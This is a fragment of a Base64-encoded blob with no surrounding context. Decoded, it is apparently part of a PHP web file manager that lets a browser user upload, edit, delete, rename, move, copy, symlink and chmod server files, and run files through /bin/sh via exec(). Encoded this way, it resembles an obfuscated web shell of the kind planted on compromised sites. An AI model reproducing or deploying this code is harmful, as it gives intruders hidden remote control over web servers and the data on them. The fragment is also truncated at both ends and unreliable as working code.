WFkZXIoJ0NvbnRlbnQtTGVuZ3RoOiAnIC4gZmlsZXNpemUoJGZpbGUpKTsNCg0KCXJlYWRmaWxlKCRmaWxlKTsNCg0KCWJyZWFrOw0KDQpjYXNlICd1cGxvYWQnOg0KDQoJJGRlc3QgPSByZWxhdGl2ZTJhYnNvbHV0ZSgkZmlsZVsnbmFtZSddLCAkZGlyZWN0b3J5KTsNCg0KCWlmIChAZmlsZV9leGlzdHMoJGRlc3QpKSB7DQoJCWxpc3RpbmdfcGFnZShlcnJvcignYWxyZWFkeV9leGlzdHMnLCAkZGVzdCkpOw0KCX0gZWxzZWlmIChAbW92ZV91cGxvYWRlZF9maWxlKCRmaWxlWyd0bXBfbmFtZSddLCAkZGVzdCkpIHsNCgkJQGNobW9kKCRkZXN0LCAkZmlsZXBlcm1pc3Npb24pOw0KCQlsaXN0aW5nX3BhZ2Uobm90aWNlKCd1cGxvYWRlZCcsICRmaWxlWyduYW1lJ10pKTsNCgl9IGVsc2Ugew0KCQlsaXN0aW5nX3BhZ2UoZXJyb3IoJ25vdF91cGxvYWRlZCcsICRmaWxlWyduYW1lJ10pKTsNCgl9DQoNCglicmVhazsNCg0KY2FzZSAnY3JlYXRlX2RpcmVjdG9yeSc6DQoNCglpZiAoQGZpbGVfZXhpc3RzKCRmaWxlKSkgew0KCQlsaXN0aW5nX3BhZ2UoZXJyb3IoJ2FscmVhZHlfZXhpc3RzJywgJGZpbGUpKTsNCgl9IGVsc2Ugew0KCQkkb2xkID0gQHVtYXNrKDA3NzcgJiB+JGRpcnBlcm1pc3Npb24pOw0KCQlpZiAoQG1rZGlyKCRmaWxlLCAkZGlycGVybWlzc2lvbikpIHsNCgkJCWxpc3RpbmdfcGFnZShub3RpY2UoJ2NyZWF0ZWQnLCAkZmlsZSkpOw0KCQl9IGVsc2Ugew0KCQkJbGlzdGluZ19wYWdlKGVycm9yKCdub3RfY3JlYXRlZCcsICRmaWxlKSk7DQoJCX0NCgkJQHVtYXNrKCRvbGQpOw0KCX0NCg0KCWJyZWFrOw0KDQpjYXNlICdjcmVhdGVfZmlsZSc6DQoNCglpZiAoQGZpbGVfZXhpc3RzKCRmaWxlKSkgew0KCQlsaXN0aW5nX3BhZ2UoZXJyb3IoJ2FscmVhZHlfZXhpc3RzJywgJGZpbGUpKTsNCgl9IGVsc2Ugew0KCQkkb2xkID0gQHVtYXNrKDA3NzcgJiB+JGZpbGVwZXJtaXNzaW9uKTsNCgkJaWYgKEB0b3VjaCgkZmlsZSkpIHsNCgkJCWVkaXQoJGZpbGUpOw0KCQl9IGVsc2Ugew0KCQkJbGlzdGluZ19wYWdlKGVycm9yKCdub3RfY3JlYXRlZCcsICRmaWxlKSk7DQoJCX0NCgkJQHVtYXNrKCRvbGQpOw0KCX0NCg0KCWJyZWFrOw0KDQpjYXNlICdleGVjdXRlJzoNCg0KCWNoZGlyKGRpcm5hbWUoJGZpbGUpKTsNCg0KCSRvdXRwdXQgPSBhcnJheSgpOw0KCSRyZXR2YWwgPSAwOw0KCWV4ZWMoJ2VjaG8gIi4vJyAuIGJhc2VuYW1lKCRmaWxlKSAuICciIHwgL2Jpbi9zaCcsICRvdXRwdXQsICRyZXR2YWwpOw0KDQoJJGVycm9yID0gKCRyZXR2YWwgPT0gMCkgPyBmYWxzZSA6IHRydWU7DQoNCglpZiAoc2l6ZW9mKCRvdXRwdXQpID09IDApICRvdXRwdXQgPSBhcnJheSgnPCcgLiAkd29yZHNbJ25vX291dHB1dCddIC4gJz4nKTsNCg0KCWlmICgkZXJyb3IpIHsNCgkJbGlzdGluZ19wYWdlKGVycm9yKCdub3RfZXhlY3V0ZWQnLCAkZmlsZSwgaW1wbG9kZSgiXG4iLCAkb3V0cHV0KSkpOw0KCX0gZWxzZSB7DQoJCWxpc3RpbmdfcGFnZShub3RpY2UoJ2V4ZWN1dGVkJywgJGZpbGUsIGltcGxvZGUoIlxuIiwgJG91dHB1dCkpKTsNCgl9DQoNCglicmVhazsNCg0KY2FzZSAnZGVsZXRlJzoNCg0KCWlmICghZW1wdHkoJF9QT1NUWydubyddKSkgew0KCQlsaXN0aW5nX3BhZ2UoKTsNCgl9IGVsc2VpZiAoIWVtcHR5KCRfUE9TVFsneWVzJ10pKSB7DQoNCgkJJGZhaWx1cmUgPSBhcnJheSgpOw0KCQkkc3VjY2VzcyA9IGFycmF5KCk7DQoNCgkJZm9yZWFjaCAoJGZpbGVzIGFzICRmaWxlKSB7DQoJCQlpZiAoZGVsKCRmaWxlKSkgew0KCQkJCSRzdWNjZXNzW10gPSAkZmlsZTsNCgkJCX0gZWxzZSB7DQoJCQkJJGZhaWx1cmVbXSA9ICRmaWxlOw0KCQkJfQ0KCQl9DQoNCgkJJG1lc3NhZ2UgPSAnJzsNCgkJaWYgKHNpemVvZigkZmFpbHVyZSkgPiAwKSB7DQoJCQkkbWVzc2FnZSA9IGVycm9yKCdub3RfZGVsZXRlZCcsIGltcGxvZGUoIlxuIiwgJGZhaWx1cmUpKTsNCgkJfQ0KCQlpZiAoc2l6ZW9mKCRzdWNjZXNzKSA+IDApIHsNCgkJCSRtZXNzYWdlIC49IG5vdGljZSgnZGVsZXRlZCcsIGltcGxvZGUoIlxuIiwgJHN1Y2Nlc3MpKTsNCgkJfQ0KDQoJCWxpc3RpbmdfcGFnZSgkbWVzc2FnZSk7DQoNCgl9IGVsc2Ugew0KDQoJCWh0bWxfaGVhZGVyKCk7DQoNCgkJZWNobyAnPGZvcm0gYWN0aW9uPSInIC4gJHNlbGYgLiAnIiBtZXRob2Q9InBvc3QiPg0KPHRhYmxlIGNsYXNzPSJkaWFsb2ciPg0KPHRyPg0KPHRkIGNsYXNzPSJkaWFsb2ciPg0KJzsNCg0KCQlyZXF1ZXN0X2R1bXAoKTsNCg0KCQllY2hvICJcdDxiPiIgLiB3b3JkKCdyZWFsbHlfZGVsZXRlJykgLiAnPC9iPg0KCTxwPg0KJzsNCg0KCQlmb3JlYWNoICgkZmlsZXMgYXMgJGZpbGUpIHsNCgkJCWVjaG8gIlx0IiAuIGh0bWwoJGZpbGUpIC4gIjxiciAvPlxuIjsNCgkJfQ0KDQoJCWVjaG8gJwk8L3A+DQoJPGhyIC8+DQoJPGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0ibm8iIHZhbHVlPSInIC4gd29yZCgnbm8nKSAuICciIGlkPSJyZWRfYnV0dG9uIiAvPg0KCTxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9InllcyIgdmFsdWU9IicgLiB3b3JkKCd5ZXMnKSAuICciIGlkPSJncmVlbl9idXR0b24iIHN0eWxlPSJtYXJnaW4tbGVmdDogNTBweCIgLz4NCjwvdGQ+DQo8L3RyPg0KPC90YWJsZT4NCjwvZm9ybT4NCg0KJzsNCg0KCQlodG1sX2Zvb3RlcigpOw0KDQoJfQ0KDQoJYnJlYWs7DQoNCmNhc2UgJ3JlbmFtZSc6DQoNCglpZiAoIWVtcHR5KCRfUE9TVFsnZGVzdGluYXRpb24nXSkpIHsNCg0KCQkkZGVzdCA9IHJlbGF0aXZlMmFic29sdXRlKCRfUE9TVFsnZGVzdGluYXRpb24nXSwgJGRpcmVjdG9yeSk7DQoNCgkJaWYgKCFAZmlsZV9leGlzdHMoJGRlc3QpICYmIEByZW5hbWUoJGZpbGUsICRkZXN0KSkgew0KCQkJbGlzdGluZ19wYWdlKG5vdGljZSgncmVuYW1lZCcsICRmaWxlLCAkZGVzdCkpOw0KCQl9IGVsc2Ugew0KCQkJbGlzdGluZ19wYWdlKGVycm9yKCdub3RfcmVuYW1lZCcsICRmaWxlLCAkZGVzdCkpOw0KCQl9DQoNCgl9IGVsc2Ugew0KDQoJCSRuYW1lID0gYmFzZW5hbWUoJGZpbGUpOw0KDQoJCWh0bWxfaGVhZGVyKCk7DQoNCgkJZWNobyAnPGZvcm0gYWN0aW9uPSInIC4gJHNlbGYgLiAnIiBtZXRob2Q9InBvc3QiPg0KDQo8dGFibGUgY2xhc3M9ImRpYWxvZyI+DQo8dHI+DQo8dGQgY2xhc3M9ImRpYWxvZyI+DQoJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYWN0aW9uIiB2YWx1ZT0icmVuYW1lIiAvPg0KCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImZpbGUiIHZhbHVlPSInIC4gaHRtbCgkZmlsZSkgLiAnIiAvPg0KCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImRpciIgdmFsdWU9IicgLiBodG1sKCRkaXJlY3RvcnkpIC4gJyIgLz4NCgk8Yj4nIC4gd29yZCgncmVuYW1lX2ZpbGUnKSAuICc8L2I+DQoJPHA+JyAuIGh0bWwoJGZpbGUpIC4gJzwvcD4NCgk8Yj4nIC4gc3Vic3RyKCRmaWxlLCAwLCBzdHJsZW4oJGZpbGUpIC0gc3RybGVuKCRuYW1lKSkgLiAnPC9iPg0KCTxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJkZXN0aW5hdGlvbiIgc2l6ZT0iJyAuIHRleHRmaWVsZHNpemUoJG5hbWUpIC4gJyIgdmFsdWU9IicgLiBodG1sKCRuYW1lKSAuICciIC8+DQoJPGhyIC8+DQoJPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IicgLiB3b3JkKCdyZW5hbWUnKSAuICciIC8+DQo8L3RkPg0KPC90cj4NCjwvdGFibGU+DQoNCjxwPjxhIGhyZWY9IicgLiAkc2VsZiAuICc/ZGlyPScgLiB1cmxlbmNvZGUoJGRpcmVjdG9yeSkgLiAnIj5bICcgLiB3b3JkKCdiYWNrJykgLiAnIF08L2E+PC9wPg0KDQo8L2Zvcm0+DQoNCic7DQoNCgkJaHRtbF9mb290ZXIoKTsNCg0KCX0NCg0KCWJyZWFrOw0KDQpjYXNlICdtb3ZlJzoNCg0KCWlmICghZW1wdHkoJF9QT1NUWydkZXN0aW5hdGlvbiddKSkgew0KDQoJCSRkZXN0ID0gcmVsYXRpdmUyYWJzb2x1dGUoJF9QT1NUWydkZXN0aW5hdGlvbiddLCAkZGlyZWN0b3J5KTsNCg0KCQkkZmFpbHVyZSA9IGFycmF5KCk7DQoJCSRzdWNjZXNzID0gYXJyYXkoKTsNCg0KCQlmb3JlYWNoICgkZmlsZXMgYXMgJGZpbGUpIHsNCgkJCSRmaWxlbmFtZSA9IHN1YnN0cigkZmlsZSwgc3RybGVuKCRkaXJlY3RvcnkpKTsNCgkJCSRkID0gJGRlc3QgLiAkZmlsZW5hbWU7DQoJCQlpZiAoIUBmaWxlX2V4aXN0cygkZCkgJiYgQHJlbmFtZSgkZmlsZSwgJGQpKSB7DQoJCQkJJHN1Y2Nlc3NbXSA9ICRmaWxlOw0KCQkJfSBlbHNlIHsNCgkJCQkkZmFpbHVyZVtdID0gJGZpbGU7DQoJCQl9DQoJCX0NCg0KCQkkbWVzc2FnZSA9ICcnOw0KCQlpZiAoc2l6ZW9mKCRmYWlsdXJlKSA+IDApIHsNCgkJCSRtZXNzYWdlID0gZXJyb3IoJ25vdF9tb3ZlZCcsIGltcGxvZGUoIlxuIiwgJGZhaWx1cmUpLCAkZGVzdCk7DQoJCX0NCgkJaWYgKHNpemVvZigkc3VjY2VzcykgPiAwKSB7DQoJCQkkbWVzc2FnZSAuPSBub3RpY2UoJ21vdmVkJywgaW1wbG9kZSgiXG4iLCAkc3VjY2VzcyksICRkZXN0KTsNCgkJfQ0KDQoJCWxpc3RpbmdfcGFnZSgkbWVzc2FnZSk7DQoNCgl9IGVsc2Ugew0KDQoJCWh0bWxfaGVhZGVyKCk7DQoNCgkJZWNobyAnPGZvcm0gYWN0aW9uPSInIC4gJHNlbGYgLiAnIiBtZXRob2Q9InBvc3QiPg0KDQo8dGFibGUgY2xhc3M9ImRpYWxvZyI+DQo8dHI+DQo8dGQgY2xhc3M9ImRpYWxvZyI+DQonOw0KDQoJCXJlcXVlc3RfZHVtcCgpOw0KDQoJCWVjaG8gIlx0PGI+IiAuIHdvcmQoJ21vdmVfZmlsZXMnKSAuICc8L2I+DQoJPHA+DQonOw0KDQoJCWZvcmVhY2ggKCRmaWxlcyBhcyAkZmlsZSkgew0KCQkJZWNobyAiXHQiIC4gaHRtbCgkZmlsZSkgLiAiPGJyIC8+XG4iOw0KCQl9DQoNCgkJZWNobyAnCTwvcD4NCgk8aHIgLz4NCgknIC4gd29yZCgnZGVzdGluYXRpb24nKSAuICc6DQoJPGlucHV0IHR5cGU9InRleHQiIG5hbWU9ImRlc3RpbmF0aW9uIiBzaXplPSInIC4gdGV4dGZpZWxkc2l6ZSgkZGlyZWN0b3J5KSAuICciIHZhbHVlPSInIC4gaHRtbCgkZGlyZWN0b3J5KSAuICciIC8+DQoJPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IicgLiB3b3JkKCdtb3ZlJykgLiAnIiAvPg0KPC90ZD4NCjwvdHI+DQo8L3RhYmxlPg0KDQo8cD48YSBocmVmPSInIC4gJHNlbGYgLiAnP2Rpcj0nIC4gdXJsZW5jb2RlKCRkaXJlY3RvcnkpIC4gJyI+WyAnIC4gd29yZCgnYmFjaycpIC4gJyBdPC9hPjwvcD4NCg0KPC9mb3JtPg0KDQonOw0KDQoJCWh0bWxfZm9vdGVyKCk7DQoNCgl9DQoNCglicmVhazsNCg0KY2FzZSAnY29weSc6DQoNCglpZiAoIWVtcHR5KCRfUE9TVFsnZGVzdGluYXRpb24nXSkpIHsNCg0KCQkkZGVzdCA9IHJlbGF0aXZlMmFic29sdXRlKCRfUE9TVFsnZGVzdGluYXRpb24nXSwgJGRpcmVjdG9yeSk7DQoNCgkJaWYgKEBpc19kaXIoJGRlc3QpKSB7DQoNCgkJCSRmYWlsdXJlID0gYXJyYXkoKTsNCgkJCSRzdWNjZXNzID0gYXJyYXkoKTsNCg0KCQkJZm9yZWFjaCAoJGZpbGVzIGFzICRmaWxlKSB7DQoJCQkJJGZpbGVuYW1lID0gc3Vic3RyKCRmaWxlLCBzdHJsZW4oJGRpcmVjdG9yeSkpOw0KCQkJCSRkID0gYWRkc2xhc2goJGRlc3QpIC4gJGZpbGVuYW1lOw0KCQkJCWlmICghQGlzX2RpcigkZmlsZSkgJiYgIUBmaWxlX2V4aXN0cygkZCkgJiYgQGNvcHkoJGZpbGUsICRkKSkgew0KCQkJCQkkc3VjY2Vzc1tdID0gJGZpbGU7DQoJCQkJfSBlbHNlIHsNCgkJCQkJJGZhaWx1cmVbXSA9ICRmaWxlOw0KCQkJCX0NCgkJCX0NCg0KCQkJJG1lc3NhZ2UgPSAnJzsNCgkJCWlmIChzaXplb2YoJGZhaWx1cmUpID4gMCkgew0KCQkJCSRtZXNzYWdlID0gZXJyb3IoJ25vdF9jb3BpZWQnLCBpbXBsb2RlKCJcbiIsICRmYWlsdXJlKSwgJGRlc3QpOw0KCQkJfQ0KCQkJaWYgKHNpemVvZigkc3VjY2VzcykgPiAwKSB7DQoJCQkJJG1lc3NhZ2UgLj0gbm90aWNlKCdjb3BpZWQnLCBpbXBsb2RlKCJcbiIsICRzdWNjZXNzKSwgJGRlc3QpOw0KCQkJfQ0KDQoJCQlsaXN0aW5nX3BhZ2UoJG1lc3NhZ2UpOw0KDQoJCX0gZWxzZSB7DQoNCgkJCWlmICghQGZpbGVfZXhpc3RzKCRkZXN0KSAmJiBAY29weSgkZmlsZSwgJGRlc3QpKSB7DQoJCQkJbGlzdGluZ19wYWdlKG5vdGljZSgnY29waWVkJywgJGZpbGUsICRkZXN0KSk7DQoJCQl9IGVsc2Ugew0KCQkJCWxpc3RpbmdfcGFnZShlcnJvcignbm90X2NvcGllZCcsICRmaWxlLCAkZGVzdCkpOw0KCQkJfQ0KDQoJCX0NCg0KCX0gZWxzZSB7DQoNCgkJaHRtbF9oZWFkZXIoKTsNCg0KCQllY2hvICc8Zm9ybSBhY3Rpb249IicgLiAkc2VsZiAuICciIG1ldGhvZD0icG9zdCI+DQoNCjx0YWJsZSBjbGFzcz0iZGlhbG9nIj4NCjx0cj4NCjx0ZCBjbGFzcz0iZGlhbG9nIj4NCic7DQoNCgkJcmVxdWVzdF9kdW1wKCk7DQoNCgkJZWNobyAiXG48Yj4iIC4gd29yZCgnY29weV9maWxlcycpIC4gJzwvYj4NCgk8cD4NCic7DQoNCgkJZm9yZWFjaCAoJGZpbGVzIGFzICRmaWxlKSB7DQoJCQllY2hvICJcdCIgLiBodG1sKCRmaWxlKSAuICI8YnIgLz5cbiI7DQoJCX0NCg0KCQllY2hvICcJPC9wPg0KCTxociAvPg0KCScgLiB3b3JkKCdkZXN0aW5hdGlvbicpIC4gJzoNCgk8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iZGVzdGluYXRpb24iIHNpemU9IicgLiB0ZXh0ZmllbGRzaXplKCRkaXJlY3RvcnkpIC4gJyIgdmFsdWU9IicgLiBodG1sKCRkaXJlY3RvcnkpIC4gJyIgLz4NCgk8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iJyAuIHdvcmQoJ2NvcHknKSAuICciIC8+DQo8L3RkPg0KPC90cj4NCjwvdGFibGU+DQoNCjxwPjxhIGhyZWY9IicgLiAkc2VsZiAuICc/ZGlyPScgLiB1cmxlbmNvZGUoJGRpcmVjdG9yeSkgLiAnIj5bICcgLiB3b3JkKCdiYWNrJykgLiAnIF08L2E+PC9wPg0KDQo8L2Zvcm0+DQoNCic7DQoNCgkJaHRtbF9mb290ZXIoKTsNCg0KCX0NCg0KCWJyZWFrOw0KDQpjYXNlICdjcmVhdGVfc3ltbGluayc6DQoNCglpZiAoIWVtcHR5KCRfUE9TVFsnZGVzdGluYXRpb24nXSkpIHsNCg0KCQkkZGVzdCA9IHJlbGF0aXZlMmFic29sdXRlKCRfUE9TVFsnZGVzdGluYXRpb24nXSwgJGRpcmVjdG9yeSk7DQoNCgkJaWYgKHN1YnN0cigkZGVzdCwgLTEsIDEpID09ICRkZWxpbSkgJGRlc3QgLj0gYmFzZW5hbWUoJGZpbGUpOw0KDQoJCWlmICghZW1wdHkoJF9QT1NUWydyZWxhdGl2ZSddKSkgJGZpbGUgPSBhYnNvbHV0ZTJyZWxhdGl2ZShhZGRzbGFzaChkaXJuYW1lKCRkZXN0KSksICRmaWxlKTsNCg0KCQlpZiAoIUBmaWxlX2V4aXN0cygkZGVzdCkgJiYgQHN5bWxpbmsoJGZpbGUsICRkZXN0KSkgew0KCQkJbGlzdGluZ19wYWdlKG5vdGljZSgnc3ltbGlua2VkJywgJGZpbGUsICRkZXN0KSk7DQoJCX0gZWxzZSB7DQoJCQlsaXN0aW5nX3BhZ2UoZXJyb3IoJ25vdF9zeW1saW5rZWQnLCAkZmlsZSwgJGRlc3QpKTsNCgkJfQ0KDQoJfSBlbHNlIHsNCg0KCQlodG1sX2hlYWRlcigpOw0KDQoJCWVjaG8gJzxmb3JtIGFjdGlvbj0iJyAuICRzZWxmIC4gJyIgbWV0aG9kPSJwb3N0Ij4NCg0KPHRhYmxlIGNsYXNzPSJkaWFsb2ciIGlkPSJzeW1saW5rIj4NCjx0cj4NCgk8dGQgc3R5bGU9InZlcnRpY2FsLWFsaWduOiB0b3AiPicgLiB3b3JkKCdkZXN0aW5hdGlvbicpIC4gJzogPC90ZD4NCgk8dGQ+DQoJCTxiPicgLiBodG1sKCRmaWxlKSAuICc8L2I+PGJyIC8+DQoJCTxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0icmVsYXRpdmUiIHZhbHVlPSJ5ZXMiIGlkPSJjaGVja2JveF9yZWxhdGl2ZSIgY2hlY2tlZD0iY2hlY2tlZCIgc3R5bGU9Im1hcmdpbi10b3A6IDFleCIgLz4NCgkJPGxhYmVsIGZvcj0iY2hlY2tib3hfcmVsYXRpdmUiPicgLiB3b3JkKCdyZWxhdGl2ZScpIC4gJzwvbGFiZWw+DQoJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImFjdGlvbiIgdmFsdWU9ImNyZWF0ZV9zeW1saW5rIiAvPg0KCQk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJmaWxlIiB2YWx1ZT0iJyAuIGh0bWwoJGZpbGUpIC4gJyIgLz4NCgkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZGlyIiB2YWx1ZT0iJyAuIGh0bWwoJGRpcmVjdG9yeSkgLiAnIiAvPg0KCTwvdGQ+DQo8L3RyPg0KPHRyPg0KCTx0ZD4nIC4gd29yZCgnc3ltbGluaycpIC4gJzogPC90ZD4NCgk8dGQ+DQoJCTxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJkZXN0aW5hdGlvbiIgc2l6ZT0iJyAuIHRleHRmaWVsZHNpemUoJGRpcmVjdG9yeSkgLiAnIiB2YWx1ZT0iJyAuIGh0bWwoJGRpcmVjdG9yeSkgLiAnIiAvPg0KCQk8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iJyAuIHdvcmQoJ2NyZWF0ZV9zeW1saW5rJykgLiAnIiAvPg0KCTwvdGQ+DQo8L3RyPg0KPC90YWJsZT4NCg0KPHA+PGEgaHJlZj0iJyAuICRzZWxmIC4gJz9kaXI9JyAuIHVybGVuY29kZSgkZGlyZWN0b3J5KSAuICciPlsgJyAuIHdvcmQoJ2JhY2snKSAuICcgXTwvYT48L3A+DQoNCjwvZm9ybT4NCg0KJzsNCg0KCQlodG1sX2Zvb3RlcigpOw0KDQoJfQ0KDQoJYnJlYWs7DQoNCmNhc2UgJ2VkaXQnOg0KDQoJaWYgKCFlbXB0eSgkX1BPU1RbJ3NhdmUnXSkpIHsNCg0KCQkkY29udGVudCA9IHN0cl9yZXBsYWNlKCJcclxuIiwgIlxuIiwgJF9QT1NUWydjb250ZW50J10pOw0KDQoJCWlmICgoJGYgPSBAZm9wZW4oJGZpbGUsICd3JykpICYmIEBmd3JpdGUoJGYsICRjb250ZW50KSAhPT0gZmFsc2UgJiYgQGZjbG9zZSgkZikpIHsNCgkJCWxpc3RpbmdfcGFnZShub3RpY2UoJ3NhdmVkJywgJGZpbGUpKTsNCgkJfSBlbHNlIHsNCgkJCWxpc3RpbmdfcGFnZShlcnJvcignbm90X3NhdmVkJywgJGZpbGUpKTsNCgkJfQ0KDQoJfSBlbHNlIHsNCg0KCQlpZiAoQGlzX3JlYWRhYmxlKCRmaWxlKSAmJiBAaXNfd3JpdGFibGUoJGZpbGUpKSB7DQoJCQllZGl0KCRmaWxlKTsNCgkJfSBlbHNlIHsNCgkJCWxpc3RpbmdfcGFnZShlcnJvcignbm90X2VkaXRlZCcsICRmaWxlKSk7DQoJCX0NCg0KCX0NCg0KCWJyZWFrOw0KDQpjYXNlICdwZXJtaXNzaW9uJzoNCg0KCWlmICghZW1wdHkoJF9QT1NUWydzZXQnXSkpIHsNCg0KCQkkbW9kZSA9IDA7DQoJCWlmICghZW1wdHkoJF9QT1NUWyd1ciddKSkgJG1vZGUgfD0gMDQwMDsgaWYgKCFlbXB0eSgkX1BPU1RbJ3V3J10pKSAkbW9kZSB8PSAwMjAwOyBpZiAoIWVtcHR5KCRfUE9TVFsndXgnXSkpICRtb2RlIHw9IDAxMDA7DQoJCWlmICghZW1wdHkoJF9QT1NUWydnciddKSkgJG1vZGUgfD0gMDA0MDsgaWYgKCFlbXB0eSgkX1BPU1RbJ2d3J10pKSAkbW9kZSB8PSAwMDIwOyBpZiAoIWVtcHR5KCRfUE9TVFsnZ3gnXSkpICRtb2RlIHw9IDAwMTA7DQoJCWlmICghZW1wdHkoJF9QT1NUWydvciddKSkgJG1vZGUgfD0gMDAwNDsgaWYgKCFlbXB0eSgkX1BPU1RbJ293J10pKSAkbW9kZSB8PSAwMDAyOyBpZiAoIWVtcHR5KCRfUE9TVFsnb3gnXSkpICRtb2RlIHw9IDAwMDE7DQoNCgkJaWYgKEBjaG1vZCgkZmlsZSwgJG1vZGUpKSB7DQoJCQlsaXN0aW5nX3BhZ2Uobm90aWNlKCdwZXJtaXNzaW9uX3NldCcsICRmaWxlLCBkZWNvY3QoJG1vZGUpKSk7DQoJCX0gZWxzZSB7DQoJCQlsaXN0aW5nX3BhZ2UoZXJyb3IoJ3Blcm1pc3Npb25fbm90X3NldCcsICRmaWxlLCBkZWNvY3QoJG1vZGUpKSk7DQoJCX0NCg0KCX0gZWxzZSB7DQoNCgkJaHRtbF9oZWFkZXIoKTsNCg0KCQkkbW9kZSA9IGZpbGVwZXJtcygkZmlsZSk7DQoNCgkJZWNobyAnPGZvcm0gYWN0aW9uPSInIC4gJHNlbGYgLiAnIiBtZXRob2Q9InBvc3QiPg0KDQo8dGFibGUgY2xhc3M9ImRpYWxvZyI+DQo8dHI+DQo8dGQgY2xhc3M9ImRpYWxvZyI+DQoNCgk8cCBzdHlsZT0ibWFyZ2luOiAwIj4nIC4gcGhyYXNlKCdwZXJtaXNzaW9uX2ZvcicsICRmaWxlKSAuICc8L3A+DQoNCgk8aHIgLz4NCg0KCTx0YWJsZSBpZD0icGVybWlzc2lvbiI+DQoJPHRyPg0KCQk8dGQ+PC90ZD4NCgkJPHRkIHN0eWxlPSJib3JkZXItcmlnaHQ6IDFweCBzb2xpZCBibGFjayI+JyAuIHdvcmQoJ293bmVyJykgLiAnPC90ZD4NCgkJPHRkIHN0eWxlPSJib3JkZXItcmlnaHQ6IDFweCBzb2xpZCBibGFjayI+JyAuIHdvcmQoJ2dyb3VwJykgLiAnPC90ZD4NCgkJPHRkPicgLiB3b3JkKCdvdGhlcicpIC4gJzwvdGQ+DQoJPC90cj4NCgk8dHI+DQoJCTx0ZCBzdHlsZT0idGV4dC1hbGlnbjogcmlnaHQiPicgLiB3b3JkKCdyZWFkJykgLiAnOjwvdGQ+DQoJCTx0ZD48aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9InVyIiB2YWx1ZT0iMSInOyBpZiAoJG1vZGUgJiAwMDQwMCkgZWNobyAnIGNoZWNrZWQ9ImNoZWNrZWQiJzsgZWNobyAnIC8+PC90ZD4NCgkJPHRkPjxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0iZ3IiIHZhbHVlPSIxIic7IGlmICgkbW9kZSAmIDAwMDQwKSBlY2hvICcgY2hlY2tlZD0iY2hlY2tlZCInOyBlY2hvICcgLz48L3RkPg0KCQk8dGQ+PGlucHV0IHR5cGU9ImNoZWNrYm94IiBuYW1lPSJvciIgdmFsdWU9IjEiJzsgaWYgKCRtb2RlICYgMDAwMDQpIGVjaG8gJyBjaGVja2VkPSJjaGVja2VkIic7IGVjaG8gJyAvPjwvdGQ+DQoJPC90cj4NCgk8dHI+DQoJCTx0ZCBzdHlsZT0idGV4dC1hbGlnbjogcmlnaHQiPicgLiB3b3JkKCd3cml0ZScpIC4gJzo8L3RkPg0KCQk8dGQ+PGlucHV0IHR5cGU9ImNoZWNrYm94IiBuYW1lPSJ1dyIgdmFsdWU9IjEiJzsgaWYgKCRtb2RlICYgMDAyMDApIGVjaG8gJyBjaGVja2VkPSJjaGVja2VkIic7IGVjaG8gJyAvPjwvdGQ+DQoJCTx0ZD48aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9Imd3IiB2YWx1ZT0iMSInOyBpZiAoJG1vZGUgJiAwMDAyMCkgZWNobyAnIGNoZWNrZWQ9ImNoZWNrZWQiJzsgZWNobyAnIC8+PC90ZD4NCgkJPHRkPjxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0ib3ciIHZhbHVlPSIxIic7IGlmICgkbW9kZSAmIDAwMDAyKSBlY2hvICcgY2hlY2tlZD0iY2hlY2tlZCInOyBlY2hvICcgLz48L3RkPg0KCTwvdHI+DQoJPHRyPg0KCQk8dGQgc3R5bGU9InRleHQtYWxpZ246IHJpZ2h0Ij4nIC4gd29yZCgnZXhlY3V0ZScpIC4gJzo8L3RkPg0KCQk8dGQ+PGlucHV0IHR5cGU9ImNoZWNrYm94IiBuYW1lPSJ1eCIgdmFsdWU9IjEiJzsgaWYgKCRtb2RlICYgMDAxMDApIGVjaG8gJyBjaGVja2VkPSJjaGVja2VkIic7IGVjaG8gJyAvPjwvdGQ+DQoJCTx0ZD48aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9Imd4IiB2YWx1ZT0iMSInOyBpZiAoJG1vZGUgJiAwMDAxMCkgZWNobyAnIGNoZWNrZWQ9ImNoZWNrZWQiJzsgZWNobyAnIC8+PC90ZD4NCgkJPHRkPjxpbnB1dCB0eXBlPSJjaGVja2JveCIgbmFtZT0ib3giIHZhbHVlPSIxIic7IGlmICgkbW9kZSAmIDAwMDAxKSBlY2hvICcgY2hlY2tlZD0iY2hlY2tlZCInOyBlY2hvICcgLz48L3RkPg0KCTwvdHI+DQoJPC90YWJsZT4NCg0KCTxociAvPg0KDQoJPGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0ic2V0IiB2YWx1ZT0iJyAuIHdvcmQoJ3NldCcpIC4gJyIgLz4NCg0KCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImFjdGlvbiIgdmFsdWU9InBlcm1pc3Npb24iIC8+DQoJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZmlsZSIgdmFsdWU9IicgLiBodG1sKCRmaWxlKSAuICciIC8+DQoJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iZGlyIiB2YWx1ZT0iJyAuIGh0bWwoJGRpcmVjdG9yeSkgLiAnIiAvPg0KDQo8L3RkPg0KPC90cj4NCjwvdGFibGU+DQoNCjxwPjxhIGhyZWY9IicgLiAkc2VsZiAuICc/ZGlyPScgLiB1cmxlbmNvZGUoJGRpcmVjdG9yeSkgLiAnIj5bICcg